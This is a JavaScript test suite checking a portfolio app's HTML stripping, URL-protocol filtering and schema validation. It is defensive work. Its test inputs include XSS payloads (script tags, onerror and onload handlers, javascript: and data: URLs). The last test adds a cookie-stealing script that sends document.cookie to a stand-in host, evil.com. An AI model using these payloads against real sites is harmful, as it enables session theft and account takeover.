/**
 * Tests for portfolio content sanitization (issue #969).
 * Covers sanitize.js portfolio helpers, portfolioSchemas validation,
 * and the safeHref client-side helper.
 */

import assert from 'node:assert/strict';
import test from 'node:test';

import {
  sanitizePortfolioRecord,
  sanitizePortfolioOutput,
  isSafePortfolioUrl,
  stripHtml,
  stripHtmlTruncated,
} from '../utils/sanitize.js';
import {
  portfolioContentSchema,
  portfolioPutSchema,
  isUrlSafe,
} from '../validators/portfolioSchemas.js';

// ---------- stripHtml ----------

test('stripHtml removes script tags and their contents', () => {
  assert.equal(stripHtml('Hello <script>alert(1)</script> World'), 'Hello  World');
});

test('stripHtml removes style tags and their contents', () => {
  assert.equal(stripHtml('Hi <style>body{display:none}</style> There'), 'Hi  There');
});

test('stripHtml removes HTML comments', () => {
  assert.equal(stripHtml('A<!-- comment -->B'), 'AB');
});

test('stripHtml removes all HTML tags', () => {
  assert.equal(stripHtml('<p>Hello <b>World</b></p>'), 'Hello World');
});

test('stripHtml removes img onerror handlers', () => {
  assert.equal(stripHtml('<img src=x onerror="alert(1)">after'), 'after');
});

test('stripHtml removes control characters but preserves newlines', () => {
  assert.equal(stripHtml('A\x00B\x07C\nD'), 'ABC\nD');
});

test('stripHtml is safe on null and undefined', () => {
  assert.equal(stripHtml(null), '');
  assert.equal(stripHtml(undefined), '');
});

test('stripHtmlTruncated respects max length', () => {
  assert.equal(stripHtmlTruncated('<b>abcdefghij</b>', 5), 'abcde');
});

// ---------- isSafePortfolioUrl ----------

test('isSafePortfolioUrl accepts http and https', () => {
  assert.equal(isSafePortfolioUrl('https://github.com/alice'), true);
  assert.equal(isSafePortfolioUrl('http://example.com'), true);
});

test('isSafePortfolioUrl accepts relative paths', () => {
  assert.equal(isSafePortfolioUrl('/p/alice'), true);
  assert.equal(isSafePortfolioUrl('/uploads/file.pdf'), true);
});

test('isSafePortfolioUrl rejects javascript: protocol', () => {
  assert.equal(isSafePortfolioUrl('javascript:alert(1)'), false);
  assert.equal(isSafePortfolioUrl('JAVASCRIPT:alert(1)'), false);
  assert.equal(isSafePortfolioUrl('  javascript:alert(1)'), false);
});

test('isSafePortfolioUrl rejects data: protocol', () => {
  assert.equal(isSafePortfolioUrl('data:text/html,<script>alert(1)</script>'), false);
  assert.equal(isSafePortfolioUrl('data:image/png;base64,abc'), false);
});

test('isSafePortfolioUrl rejects vbscript:, file:, about:, chrome:', () => {
  for (const proto of ['vbscript', 'file', 'about', 'chrome', 'jar', 'mocha']) {
    assert.equal(isSafePortfolioUrl(`${proto}:payload`), false);
  }
});

test('isSafePortfolioUrl rejects non-string and empty values', () => {
  assert.equal(isSafePortfolioUrl(''), false);
  assert.equal(isSafePortfolioUrl(null), false);
  assert.equal(isSafePortfolioUrl(undefined), false);
  assert.equal(isSafePortfolioUrl(123), false);
  assert.equal(isSafePortfolioUrl({}), false);
});

test('isSafePortfolioUrl rejects URLs longer than 2048 chars', () => {
  assert.equal(isSafePortfolioUrl('https://example.com/' + 'a'.repeat(2050)), false);
});

// ---------- isUrlSafe (validator helper) ----------

test('isUrlSafe matches isSafePortfolioUrl for the same input', () => {
  const cases = [
    'https://github.com/alice',
    'http://example.com',
    '/p/alice',
    'javascript:alert(1)',
    'data:text/html,<script>',
    '  JAVASCRIPT:alert(1)',
  ];
  for (const c of cases) {
    assert.equal(isUrlSafe(c), isSafePortfolioUrl(c), `mismatch for ${c}`);
  }
});

// ---------- sanitizePortfolioRecord ----------

test('sanitizePortfolioRecord strips script tags from bio', () => {
  const out = sanitizePortfolioRecord({
    bio: 'Hello <script>alert(1)</script> World',
  });
  assert.equal(out.bio, 'Hello  World');
  assert.ok(!/<script/i.test(out.bio));
});

test('sanitizePortfolioRecord strips img onerror from project description', () => {
  const out = sanitizePortfolioRecord({
    projects: [
      {
        name: 'My Project',
        description: '<img src=x onerror="alert(1)">actual desc',
      },
    ],
  });
  assert.equal(out.projects.length, 1);
  assert.equal(out.projects[0].name, 'My Project');
  assert.ok(!/<img/i.test(out.projects[0].description));
  assert.ok(!/onerror/i.test(out.projects[0].description));
});

test('sanitizePortfolioRecord strips javascript: URL from project link', () => {
  const out = sanitizePortfolioRecord({
    projects: [
      {
        name: 'My Project',
        link: 'javascript:alert(1)',
      },
    ],
  });
  assert.equal(out.projects[0].link, undefined);
});

test('sanitizePortfolioRecord strips javascript: URL from socialLinks', () => {
  const out = sanitizePortfolioRecord({
    socialLinks: {
      github: 'https://github.com/alice',
      linkedin: 'javascript:void(0)',
    },
  });
  assert.equal(out.socialLinks.github, 'https://github.com/alice');
  assert.equal(out.socialLinks.linkedin, undefined);
});

test('sanitizePortfolioRecord keeps safe http(s) URLs', () => {
  const out = sanitizePortfolioRecord({
    socialLinks: {
      github: 'https://github.com/alice',
      linkedin: 'https://linkedin.com/in/alice',
      website: 'https://alice.dev',
    },
    customDomain: 'alice.dev',
    projects: [
      {
        name: 'Proj',
        link: 'https://alice.dev/proj',
        github: 'https://github.com/alice/proj',
        demo: 'http://demo.example.com',
      },
    ],
  });
  assert.equal(out.socialLinks.github, 'https://github.com/alice');
  assert.equal(out.socialLinks.linkedin, 'https://linkedin.com/in/alice');
  assert.equal(out.socialLinks.website, 'https://alice.dev');
  assert.equal(out.customDomain, 'alice.dev');
  assert.equal(out.projects[0].link, 'https://alice.dev/proj');
  assert.equal(out.projects[0].github, 'https://github.com/alice/proj');
  assert.equal(out.projects[0].demo, 'http://demo.example.com');
});

test('sanitizePortfolioRecord strips HTML from skill names', () => {
  const out = sanitizePortfolioRecord({
    skills: [{ name: '<script>alert(1)</script>JavaScript' }, { name: 'Python' }, null],
  });
  assert.equal(out.skills.length, 2);
  assert.equal(out.skills[0].name, 'JavaScript');
  assert.equal(out.skills[1].name, 'Python');
});

test('sanitizePortfolioRecord strips HTML from badge metadata', () => {
  const out = sanitizePortfolioRecord({
    badges: [
      {
        name: '<img src=x onerror=alert(1)>Champion',
        description: 'Earned <b>top</b> place',
        tier: '<script>1</script>gold',
        iconUrl: 'javascript:alert(1)',
      },
    ],
  });
  assert.equal(out.badges[0].name, 'Champion');
  assert.equal(out.badges[0].description, 'Earned top place');
  assert.equal(out.badges[0].tier, 'gold');
  assert.equal(out.badges[0].iconUrl, undefined);
});

test('sanitizePortfolioRecord sanitizes roadmap milestones', () => {
  const out = sanitizePortfolioRecord({
    roadmaps: [
      {
        title: 'Path <script>x</script>',
        milestones: [
          { title: '<img onerror=alert(1)>Step 1', completed: true },
          { title: 'Step 2' },
        ],
      },
    ],
  });
  assert.equal(out.roadmaps[0].title, 'Path');
  assert.equal(out.roadmaps[0].milestones[0].title, 'Step 1');
  assert.equal(out.roadmaps[0].milestones[0].completed, true);
  assert.equal(out.roadmaps[0].milestones[1].title, 'Step 2');
});

test('sanitizePortfolioRecord caps array sizes', () => {
  const skills = Array.from({ length: 200 }, (_, i) => ({ name: `Skill${i}` }));
  const out = sanitizePortfolioRecord({ skills });
  assert.equal(out.skills.length, 100, 'should cap skills at 100');
});

test('sanitizePortfolioRecord truncates long bio strings', () => {
  const out = sanitizePortfolioRecord({ bio: 'a'.repeat(6000) });
  assert.equal(out.bio.length, 5000);
});

test('sanitizePortfolioRecord strips HTML from seoMetadata values', () => {
  const out = sanitizePortfolioRecord({
    seoMetadata: {
      description: '<script>steal()</script>My description',
      keywords: 'a, b, c',
    },
  });
  assert.equal(out.seoMetadata.description, 'My description');
  assert.equal(out.seoMetadata.keywords, 'a, b, c');
});

test('sanitizePortfolioRecord lowercases username and trims', () => {
  const out = sanitizePortfolioRecord({ username: '  Alice  ' });
  assert.equal(out.username, 'alice');
});

test('sanitizePortfolioRecord normalizes visibleSections to booleans only', () => {
  const out = sanitizePortfolioRecord({
    visibleSections: {
      quests: true,
      roadmaps: 'yes',
      projects: 1,
      analytics: false,
    },
  });
  assert.equal(out.visibleSections.quests, true);
  assert.equal(out.visibleSections.roadmaps, undefined);
  assert.equal(out.visibleSections.projects, undefined);
  assert.equal(out.visibleSections.analytics, false);
});

test('sanitizePortfolioRecord seeds default visibleSections when none provided', () => {
  const out = sanitizePortfolioRecord({});
  assert.equal(out.visibleSections.quests, true);
  assert.equal(out.visibleSections.roadmaps, true);
  assert.equal(out.visibleSections.projects, true);
  assert.equal(out.visibleSections.analytics, false);
});

test('sanitizePortfolioOutput returns null for null input', () => {
  assert.equal(sanitizePortfolioOutput(null), null);
});

test('sanitizePortfolioOutput also strips malicious read-back data', () => {
  const out = sanitizePortfolioOutput({
    bio: 'x <script>alert(1)</script>',
    socialLinks: { twitter: 'javascript:void(0)' },
  });
  assert.equal(out.bio, 'x');
  assert.equal(out.socialLinks.twitter, undefined);
});

// ---------- portfolioPutSchema ----------

test('portfolioPutSchema accepts valid credentials', () => {
  const result = portfolioPutSchema.safeParse({
    username: 'alice_123',
    passkey: 'securePasskey!1',
  });
  assert.equal(result.success, true);
});

test('portfolioPutSchema rejects short username', () => {
  const result = portfolioPutSchema.safeParse({
    username: 'ab',
    passkey: 'securePasskey!1',
  });
  assert.equal(result.success, false);
});

test('portfolioPutSchema rejects username with invalid characters', () => {
  const result = portfolioPutSchema.safeParse({
    username: 'alice@evil',
    passkey: 'securePasskey!1',
  });
  assert.equal(result.success, false);
});

test('portfolioPutSchema rejects short passkey', () => {
  const result = portfolioPutSchema.safeParse({
    username: 'alice',
    passkey: 'short',
  });
  assert.equal(result.success, false);
});

// ---------- portfolioContentSchema ----------

test('portfolioContentSchema accepts valid portfolio body', () => {
  const result = portfolioContentSchema.safeParse({
    bio: 'A short bio',
    title: 'Developer',
    skills: [{ name: 'JavaScript' }],
    projects: [{ name: 'Proj', link: 'https://example.com', description: 'Desc' }],
    socialLinks: { github: 'https://github.com/alice' },
  });
  assert.equal(result.success, true);
});

test('portfolioContentSchema rejects javascript: project link', () => {
  const result = portfolioContentSchema.safeParse({
    projects: [{ name: 'Proj', link: 'javascript:alert(1)' }],
  });
  assert.equal(result.success, false);
});

test('portfolioContentSchema rejects data: social link', () => {
  const result = portfolioContentSchema.safeParse({
    socialLinks: { website: 'data:text/html,<script>alert(1)</script>' },
  });
  assert.equal(result.success, false);
});

test('portfolioContentSchema rejects unknown top-level fields', () => {
  const result = portfolioContentSchema.safeParse({
    bio: 'hello',
    evilField: 'should be stripped',
  });
  assert.equal(result.success, false, '.strict() should reject unknown keys');
});

test('portfolioContentSchema rejects oversized bio', () => {
  const result = portfolioContentSchema.safeParse({ bio: 'a'.repeat(5001) });
  assert.equal(result.success, false);
});

test('portfolioContentSchema rejects project with no name', () => {
  const result = portfolioContentSchema.safeParse({
    projects: [{ description: 'no name' }],
  });
  assert.equal(result.success, false);
});

// ---------- defense in depth: combined server pipeline ----------

test('server pipeline: raw XSS payload is fully neutralized', () => {
  const raw = {
    bio: 'Hi <script>fetch("evil.com?"+document.cookie)</script>',
    projects: [
      {
        name: 'My <img src=x onerror=alert(1)> Project',
        description: '<iframe src=javascript:alert(1)></iframe>Cool stuff',
        link: 'javascript:alert(1)',
        github: 'https://github.com/alice',
      },
    ],
    socialLinks: {
      github: 'https://github.com/alice',
      twitter: 'javascript:void(0)',
    },
    skills: [{ name: '<script>1</script>React' }],
    seoMetadata: { description: '<svg onload=alert(1)>tags' },
  };
  const clean = sanitizePortfolioRecord(raw);
  // No raw HTML tags anywhere
  for (const value of [
    clean.bio,
    clean.projects[0].name,
    clean.projects[0].description,
    clean.skills[0].name,
    clean.seoMetadata.description,
  ]) {
    assert.ok(!/<[a-z]/i.test(value), `unexpected tag in ${value}`);
  }
  // No dangerous protocols
  assert.equal(clean.projects[0].link, undefined);
  assert.equal(clean.socialLinks.twitter, undefined);
  // Safe URLs preserved
  assert.equal(clean.socialLinks.github, 'https://github.com/alice');
  assert.equal(clean.projects[0].github, 'https://github.com/alice');
});
